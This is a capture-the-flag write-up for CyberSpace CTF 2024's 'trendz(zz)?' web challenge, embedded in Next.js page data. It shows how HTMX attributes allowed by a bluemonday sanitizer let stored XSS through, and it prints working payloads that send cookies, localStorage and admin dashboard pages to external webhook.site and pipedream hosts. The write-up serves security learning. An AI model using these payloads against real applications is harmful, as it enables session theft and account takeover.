1:"$Sreact.fragment"
2:I[87555,[],""]
3:I[31295,[],""]
4:I[6874,["874","static/chunks/874-3e820bd666038662.js","633","static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js"],""]
6:I[59665,[],"OutletBoundary"]
8:I[74911,[],"AsyncMetadataOutlet"]
a:I[59665,[],"ViewportBoundary"]
c:I[59665,[],"MetadataBoundary"]
d:"$Sreact.suspense"
f:I[28393,[],""]
:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/154fc5c9afe7044c.css","style"]
0:{"P":null,"b":"_H-kM0bxtUnUwrwh28WmS","p":"","c":["","writeups","5af97a38d168d540bda2e5b3ae1324bf"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","5af97a38d168d540bda2e5b3ae1324bf","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/154fc5c9afe7044c.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["id","5af97a38d168d540bda2e5b3ae1324bf","d"],["$","$1","c",{"children":[null,[["$","$L4",null,{"href":"/writeups","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to writeups"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",null,["$","$L6",null,{"children":["$L7",["$","$L8",null,{"promise":"$@9"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$La",null,{"children":"$Lb"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$Lc",null,{"children":["$","div",null,{"hidden":true,"children":["$","$d",null,{"fallback":null,"children":"$Le"}]}]}]]}],false]],"m":"$undefined","G":["$f",[]],"s":false,"S":true}
b:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
7:null
10:I[50674,["263","static/chunks/bc9c3264-6371ca03223855d4.js","810","static/chunks/48507feb-8452885980bba250.js","330","static/chunks/08ffe114-f47006c90e36a3eb.js","800","static/chunks/800-bd0deb6e7b7e903a.js","134","static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js"],"default"]
11:T693,package main

import (
	"app/handlers/custom"
	"app/handlers/dashboard"
	"app/handlers/db"
	"app/handlers/jwt"
	"app/handlers/service"

	"github.com/gin-gonic/gin"
)

func main() {
	s := gin.Default()
	s.LoadHTMLGlob("templates/*")
	db.InitDBconn()
	jwt.InitJWT()

	s.GET("/", func(c *gin.Context) {
		c.Redirect(302, "/login")
	})
	s.GET("/ping", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "pong",
		})
	})
	r := s.Group("/")
	r.POST("/register", service.CreateUser)
	r.GET("/register", func(c *gin.Context) {
		c.HTML(200, "register.tmpl", gin.H{})
	})
	r.POST("/login", service.LoginUser)
	r.GET("/login", func(c *gin.Context) {
		c.HTML(200, "login.tmpl", gin.H{})
	})

	r.GET("/getAccessToken", service.GenerateAccessToken)

	authorizedEndpoints := r.Group("/user")
	authorizedEndpoints.Use(service.AuthorizeAccessToken())
	authorizedEndpoints.GET("/dashboard", dashboard.UserDashboard)
	authorizedEndpoints.POST("/posts/create", service.CreatePost)
	authorizedEndpoints.GET("/posts/:postid", service.ShowPost)
	authorizedEndpoints.GET("/flag", service.DisplayFlag)

	adminEndpoints := r.Group("/admin")
	adminEndpoints.Use(service.AuthorizeAccessToken())
	adminEndpoints.Use(service.ValidateAdmin())
	adminEndpoints.GET("/dashboard", dashboard.AdminDashboard)

	SAEndpoints := r.Group("/superadmin")
	SAEndpoints.Use(service.AuthorizeAccessToken())
	SAEndpoints.Use(service.ValidateAdmin())
	SAEndpoints.Use(service.AuthorizeRefreshToken())
	SAEndpoints.Use(service.ValidateSuperAdmin())
	SAEndpoints.GET("/viewpost/:postid", dashboard.ViewPosts)
	SAEndpoints.GET("/dashboard", dashboard.SuperAdminDashboard)
	s.NoRoute(custom.Custom404Handler)
	s.Run(":8000")
}5:["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"CyberSpace CTF 2024 — trendz(zz)?"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."}],"\n"]}],"\n",["$","blockquote","blockquote-1",{"children":["\n",["$","p","p-0",{"children":"Notice anything off in this application? If you suspect something is wrong, report it to the superadmin. You never know what secrets might be uncovered."}],"\n",["$","p","p-1",{"children":["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc trendz-bot.challs.csc.tf 1337"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a Go server that looks like this:"}],"\n",["$","$L10","pre-0",{"className":"my-2","children":"$11","language":"go"}],"\n",["$","p","p-1",{"children":["This is a 3 part challenge: we can make and share posts, and for part 3 we can report \"suspicious posts\" to the super admin via ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc"}],"."]}],"\n",["$","p","p-2",{"children":"Looking in the posts service, we can find a suspicious sanitize function looking like so:"}],"\n",["$","$L10","pre-1",{"className":"my-2","children":"func SanitizeData(data string) string {\n\tp := bluemonday.NewPolicy()\n\tp.AllowURLSchemesMatching(regexp.MustCompile(\"^https?\"))\n\tp.AllowAttrs(\"alt\", \"cite\", \"datetime\", \"dir\", \"high\", \"hx-delete\", \"hx-get\", \"hx-patch\", \"hx-post\", \"hx-put\", \"hx-swap\", \"hx-target\", \"hx-trigger\", \"hx-vals\", \"id\", \"low\", \"map\", \"max\", \"min\", \"name\", \"optimum\", \"value\").OnElements(\"a\", \"abbr\", \"acronym\", \"b\", \"br\", \"cite\", \"code\", \"dfn\", \"div\", \"em\", \"figcaption\", \"h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\", \"hgroup\", \"hr\", \"i\", \"mark\", \"p\", \"pre\", \"s\", \"samp\", \"small\", \"span\", \"strike\", \"strong\", \"sub\", \"sup\", \"tt\", \"var\", \"wbr\")\n\thtml := p.Sanitize(data)\n\treturn html\n}\n\nfunc ShowPost(ctx *gin.Context) {\n\tpostID := ctx.Param(\"postid\")\n\tDB := db.GetDBconn()\n\tvar title string\n\tvar data string\n\terr := DB.QueryRow(\"SELECT title, data FROM posts WHERE postid = $1\", postID).Scan(&title, &data)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\thtml := SanitizeData(data)\n\tctx.PureJSON(200, gin.H{\n\t\t\"title\": title, \"data\": html})\n}","language":"go"}],"\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19","\n","$L1a","\n","$L1b","\n","$L1c","\n","$L1d","\n","$L1e","\n","$L1f","\n","$L20","\n","$L21","\n","$L22","\n","$L23","\n","$L24"]}]}]
12:["$","p","p-3",{"children":["It looks like our post data is directly rendered to the DOM via ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"innerHTML"}],", but we're only allowed to use certain allowed tags and attributes defined by the sanitation policy."]}]
13:["$","p","p-4",{"children":["Suspiciously, among the allowed attributes are HTMX-specific attributes like ",["$","a","a-0",{"href":"https://htmx.org/attributes/hx-get/","children":["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-get"}]}],". Reading the documentation,"]}]
14:["$","blockquote","blockquote-2",{"children":["\n",["$","p","p-0",{"children":["The ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-get"}]," attribute will cause an element to issue a ",["$","code","code-1",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"GET"}]," to the specified URL and swap the HTML into the DOM using a swap strategy:"]}],"\n"]}]
15:["$","p","p-5",{"children":["Then, we can circumvent the sanitizer by using ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-get"}]," to fetch our malicious payload via network request and swap it in to the DOM, giving us XSS."]}]
16:["$","p","p-6",{"children":["By default, this swapping only triggers when the element is clicked, but we can use the ",["$","a","a-0",{"href":"https://htmx.org/attributes/hx-trigger/","children":["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-trigger"}]}]," property to swap in our payload on mount. Worse, however, is that ",["$","a","a-1",{"href":"https://htmx.org/reference/#config","children":[["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"htmx.config.selfRequestsOnly"}]," defaults to ",["$","code","code-1",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"true"}]]}],", meaning that we can only send HTMX GET requests to the same domain."]}]
17:["$","p","p-7",{"children":["We can host semi-arbitrary data on the same domain via posts, but we unfortunately can't simply put our payload in the post data due to the sanitizer. Instead, we can make a post with arbitrary data whose ",["$","em","em-0",{"children":"title"}]," is our malicious payload, e.g."]}]
18:["$","$L10","pre-2",{"className":"my-2","children":"<img src=x onerror='fetch(`https://webhook.site/e9569dad-ec09-4b1f-8125-3e35e1edd678?a=` + document.cookie + JSON.stringify(localStorage))'>","language":"html"}]
19:["$","p","p-8",{"children":"(making sure not to use double quotes lest the payload get JSON-escaped)."}]
1a:["$","p","p-9",{"children":"Then, our malicious post data would look something like"}]
1b:["$","$L10","pre-3",{"className":"my-2","children":"<div hx-get=\"/user/posts/5b3f1b37-3c01-4051-9a7f-1bbc020668e6\" hx-trigger=\"load\" hx-swap=\"innerHTML\"></div>","language":"html"}]
1c:["$","p","p-10",{"children":["swapping in the first posts's title and data into its ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"innerHTML"}]," for XSS."]}]
1d:["$","p","p-11",{"children":"Looking at the superadmin dashboard,"}]
1e:["$","$L10","pre-4",{"className":"my-2","children":"package dashboard\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc SuperAdminDashboard(ctx *gin.Context) {\n\tfmt.Println(\"SuperAdmin dashboard accessed\")\n\tctx.HTML(200, \"superAdminDash.tmpl\", gin.H{\n\t\t\"flag\": os.Getenv(\"SUPERADMIN_FLAG\"),\n\t})\n}\n\nfunc ViewPosts(ctx *gin.Context) {\n\tctx.HTML(200, \"viewPost.tmpl\", gin.H{\n\t\t\"PostID\": ctx.Param(\"postid\"),\n\t\t\"title\":  \"Click\",\n\t\t\"data\":   \"{{data|safe}}\",\n\t})\n}","language":"go"}]
1f:["$","p","p-12",{"children":["it looks like sending the superadmin to ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/superadmin/viewpost/{our malicious post id}"}]," causes our payload to be ",["$","a","a-0",{"href":"https://mozilla.github.io/nunjucks/templating.html#safe","children":"rendered into the DOM for XSS"}],", from where we can fetch ",["$","code","code-1",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/superadmin/dashboard"}]," to get the part 3 flag. Here's a payload that does just that:"]}]
20:["$","$L10","pre-5",{"className":"my-2","children":"<img src=x onerror='fetch(`/superadmin/dashboard`).then(x=>x.text()).then(x=>fetch(`https://enhs7ezpdsxpw.x.pipedream.net/` + btoa(x)))'>","language":"html"}]
21:["$","p","p-13",{"children":["Looking in ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"AdminDash.go"}],","]}]
22:["$","$L10","pre-6",{"className":"my-2","children":"package dashboard\n\nimport (\n\t\"app/handlers/service\"\n\t\"os\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc AdminDashboard(ctx *gin.Context) {\n\tposts := service.GetAllPosts()\n\tctx.HTML(200, \"adminDash.tmpl\", gin.H{\n\t\t\"flag\":  os.Getenv(\"ADMIN_FLAG\"),\n\t\t\"posts\": posts,\n\t})\n}","language":"go"}]
23:["$","p","p-14",{"children":["because the superadmin is also an admin, we can use the same XSS to fetch ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/admin/dashboard"}]," and get the part 1 flag:"]}]
24:["$","$L10","pre-7",{"className":"my-2","children":"<img src=x onerror='fetch(`/admin/dashboard`).then(x=>x.text()).then(x=>fetch(`https://enhs7ezpdsxpw.x.pipedream.net/` + btoa(x)))'>","language":"html"}]
9:{"metadata":[["$","title","0",{"children":"CyberSpace CTF 2024 — trendz(zz)? | kevin.fish"}],["$","meta","1",{"name":"description","content":"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."}],["$","meta","2",{"property":"og:title","content":"CyberSpace CTF 2024 — trendz(zz)?"}],["$","meta","3",{"property":"og:description","content":"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."}],["$","meta","4",{"name":"twitter:card","content":"summary"}],["$","meta","5",{"name":"twitter:title","content":"CyberSpace CTF 2024 — trendz(zz)?"}],["$","meta","6",{"name":"twitter:description","content":"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."}]],"error":null,"digest":"$undefined"}
e:"$9:metadata"
